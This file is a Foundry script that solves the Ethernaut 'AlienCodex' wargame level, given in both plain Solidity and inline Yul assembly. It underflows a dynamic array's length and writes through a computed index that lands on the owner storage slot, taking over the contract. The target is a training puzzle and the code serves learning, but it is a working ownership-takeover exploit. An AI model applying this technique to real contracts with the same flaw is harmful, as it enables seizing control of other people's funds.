// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.18;

import { console } from "forge-std/Script.sol";
import { EthernautScript } from "./Ethernaut.s.sol";

interface Instance {
    function owner() external view returns (address);

    function contact() external view returns (bool);

    function codex(uint) external view returns (bytes32);

    function make_contact() external;

    function record(bytes32 _content) external;

    function retract() external;

    function revise(uint i, bytes32 _content) external;
}

contract AlienCodexScript is EthernautScript {
    string network = "goerli";
    address level = 0x40055E69E7EB12620c8CCBCCAb1F187883301c30;

    Instance instance;

    function setUp() public override {
        super.setUp();

        vm.createSelectFork(network);
        vm.startBroadcast(pk);

        instance = Instance(createLevelInstance(level, 0));
        console.log("-> instance:", address(instance));
    }

    function baseVersion() internal {
        instance.make_contact();
        instance.retract();

        uint256 slot = uint256(keccak256(abi.encodePacked(uint256(1))));
        uint256 indexToTarget = type(uint256).max - slot + 1;
        instance.revise(indexToTarget, bytes32(uint256(uint160(player))));

        require(instance.owner() == player);
    }

    function yulVersion() internal {
        assembly {
            let _instance := sload(instance.slot)

            mstore(0, "make_contact()")
            mstore(0, keccak256(0, 14))
            pop(call(gas(), _instance, 0, 0, 4, 0, 0)) // i dont check if the call succeeds because if it fails, the next one will fail anyway

            mstore(0, "retract()")
            mstore(0, keccak256(0, 9))
            let success := call(gas(), _instance, 0, 0, 4, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            mstore(0, 1)
            mstore(0, keccak256(0, 0x20))
            let slot := mload(0)

            // in Solidity 0.8 we can't underflow. But in Yul we don't care
            // So this is equal to: 0 - slot + 1 which is equal to: type(uint256).max - slot + 1
            let indexToTarget := sub(0, mload(0))

            let fmp := mload(0x40)
            mstore(fmp, "revise(uint256,bytes32)")
            mstore(fmp, keccak256(fmp, 23))
            mstore(add(fmp, 4), indexToTarget)
            mstore(add(fmp, 0x24), sload(player.slot))
            success := call(gas(), _instance, 0, fmp, 0x44, 0, 0)
            if iszero(success) {
                revert(0, 0)
            }

            mstore(0, "owner()")
            mstore(0, keccak256(0, 7))
            pop(staticcall(gas(), _instance, 0, 4, 0, 32))
            if iszero(eq(mload(0), sload(player.slot))) {
                revert(0, 0)
            }
        }
    }

    function run() public {
        // baseVersion();
        yulVersion();

        submitLevelInstance(payable(address(instance)), level);
        vm.stopBroadcast();
    }
}
